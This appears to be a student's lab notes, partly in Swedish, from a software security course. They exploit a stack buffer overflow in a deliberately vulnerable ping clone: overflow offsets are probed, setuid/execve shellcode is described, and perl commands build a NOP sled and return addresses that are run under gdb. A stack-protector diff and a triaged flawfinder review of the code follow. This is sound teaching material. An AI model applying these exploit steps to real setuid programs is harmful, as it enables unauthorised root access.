@@ -1,0 +1,160 @@
+Notes
+
+(gdb) print &ifr
+$1 = (struct ifreq *) 0x7fffffffded0
+
+andst152@debian:~/pong/src$ pong -I $(perl -e 'print "A"x247;') 224.224.224.224
+ping: unknown iface AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+andst152@debian:~/pong/src$ pong -I $(perl -e 'print "A"x248;') 224.224.224.224
+ping: unknown iface AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+
+shellcode.s:
+De forsta raderna satter upp rdi=0 och rax=0 for att gora setuid(0) (root). Darefter vill vi satta upp parametrar
+for att utfora execve("/bin/sh", NULL, NULL). Det gor vi genom att satta rdx=0, rsi=0, och lagga en pekare till strangen
+"/bin/sh" pa stacken. Darefter exekveras syscall #59 (execve).
+
+andst152@debian:~/pong/exploit$ wc -c shellcode
+41 shellcode
+
+The NOP sled is for the code to have somewhere to "land", a window of addresses which all lead to
+execution of the code that comes after. This is easier than finding the exact address at which the
+exploit code is located.
+
+andst152@debian:~/pong/exploit$ perl -e 'print "\x90"x250;' > nopsled
+andst152@debian:~/pong/exploit$ perl -e 'print "\xd0\xde\xff\xff\xff\x7f";' > returns
+
+(gdb) br main
+Breakpoint 1 at 0x2539: file ping.c, line 123.
+(gdb) br 253
+Breakpoint 2 at 0x2bd7: file ping.c, line 253.
+(gdb) br 261
+Breakpoint 3 at 0x2cbd: file ping.c, line 261.
+(gdb) run -I $(cat nopsled shellcode returns) 224.224.224.224
+
+
+
+4-5 Address of ifr
+(gdb) print &ifr
+$1 = (struct ifreq *) 0x7fffffffdec0
+(gdb) 
+
+5-1
+Does not crash at 247, does crash at 248
+
+5-3 Size of shellcode
+andst152@debian:~/pong/exploit$ wc -c shellcode
+41 shellcode
+
+Best address to use, something that is guaranteed to be in the NOP sled, middle is good.
+0x7fffffffdf28
+
+andst152@debian:~/pong/exploit$ perl -e 'print "\x90"x206;' > nopsled
+andst152@debian:~/pong/exploit$ perl -e 'print "\x28\xdf\xff\xff\xff\x7f";' > returns
+andst152@debian:~/pong/exploit$
+
+Any address between 0x7fffffffddc0 and 0x7fffffffddc0 + 205
+
+perl -e 'print "\x20\xde\xff\xff\xff\x7f\x00\x00"x4;' > returns
+
+
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from /bin/pong...
+(gdb) br main
+Breakpoint 1 at 0x2539: file ping.c, line 123.
+(gdb) br 253
+Breakpoint 2 at 0x2bd7: file ping.c, line 253.
+(gdb) br 261
+Breakpoint 3 at 0x2cbd: file ping.c, line 261.
+(gdb) run -I $(cat nopsled shellcode returns) 224.224.224.224
+Starting program: /usr/bin/pong -I $(cat nopsled shellcode returns) 224.224.224.224
+/bin/bash: line 1: warning: command substitution: ignored null byte in input
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, main (argc=8, argv=0x7fffffffdf98) at ping.c:123
+warning: 123	ping.c: No such file or directory
+(gdb) c
+Continuing.
+ping: unknown host ����
+[Inferior 1 (process 20900) exited with code 02]
+(gdb) quit
+
+--- Exercise 7 ---------------------------
+andst152@debian:~/pong/gcc$ diff -u sp_without.s sp_with.s 
+--- sp_without.s	2025-12-14 08:54:01.281118747 +0100
++++ sp_with.s	2025-12-14 08:53:22.609021348 +0100
+@@ -11,16 +11,24 @@
+ 	.cfi_offset 6, -16
+ 	mov	rbp, rsp
+ 	.cfi_def_cfa_register 6
+-	sub	rsp, 96
+-	mov	DWORD PTR -84[rbp], edi
+-	mov	QWORD PTR -96[rbp], rsi
+-	mov	rax, QWORD PTR -96[rbp]
++	sub	rsp, 112
++	mov	DWORD PTR -100[rbp], edi
++	mov	QWORD PTR -112[rbp], rsi
++	mov	rax, QWORD PTR fs:40
++	mov	QWORD PTR -8[rbp], rax
++	xor	eax, eax
++	mov	rax, QWORD PTR -112[rbp]
+ 	mov	rdx, QWORD PTR [rax]
+-	lea	rax, -80[rbp]
++	lea	rax, -96[rbp]
+ 	mov	rsi, rdx
+ 	mov	rdi, rax
+ 	call	strcpy@PLT
+ 	mov	eax, 0
++	mov	rdx, QWORD PTR -8[rbp]
++	sub	rdx, QWORD PTR fs:40
++	je	.L3
++	call	__stack_chk_fail@PLT
++.L3:
+ 	leave
+ 	.cfi_def_cfa 7, 8
+ 	ret
+andst152@debian:~/pong/gcc$ cat sp.c
+#include <string.h>
+
+int main(int argc, char **argv) {
+  char buffer[80];
+  strcpy(buffer, argv[0]);
+}
+
+--- Exercise 8 ---------------------------
+--- Exercise 9 ---------------------------
+--- Exercise 10 --------------------------
+--- Exercise 11 --------------------------
+
+A good and thorough review! I don't think the bcopy is actually exploitable (I don't think it is one of the vulnerabilities inserted by us at least). Also note that integer overflows and sign errors are only exploitable if they can be used to bypass input validation or cause e.g. incorrect allocation of buffers.
+
+1.3.1 Buffer overflow of target, hnamebuf, and ifr.ifr name
+1.3.2 Format string bugs in output functions
+1.3.5 Integer overflow/Sign error on datalen (NOT EXPLOITABLE)
+
+ping.c:125: [3] (buffer) getopt - KANSKE VALID (ska det vara != -1 ist¨allet f¨or EOF?):
+Some older implementations do not protect against internal buffer overflows
+(CWE-120, CWE-20). Check implementation on installation, or limit the size
+of all string inputs.
+
+ping.c:1151: [2] (buffer) char - KANSKE VALID (sin_addr igen):
+Statically-sized arrays can be improperly restricted, leading to potential
+overflows or other issues (CWE-119!/CWE-120). Perform bounds checking, use
+functions that limit length, or ensure that the size is larger than the
+maximum possible length.
+
+ping.c:231:  [2] (buffer) memcpy - KANSKE VALID (kollar inte storlek, men kopierar enbart in 4 bytes):
+ping.c:620:  [2] (buffer) memcpy - KANSKE VALID (beror på storlek av icp, timeval kan max vara 16 bytes pga storleken av time_t):
+
+ping_common.c:166: [2] (integer) atoi - VALID (kan vara negativ):
+
+ping.c:1154: High: gethostbyaddr - KANSKE VALID (len ¨ar satt till 4, men om attackerare kontrollerar D
+DNS results can easily be forged by an attacker (or
+arbitrarily set to large values, etc), and should not be trusted.
+
+--------------------------------------------------
+
+--- Not exploitable ---
+1.3.4 Sign error in -I case of main loop
+1.3.3 Bcopy could cause buffer overflow
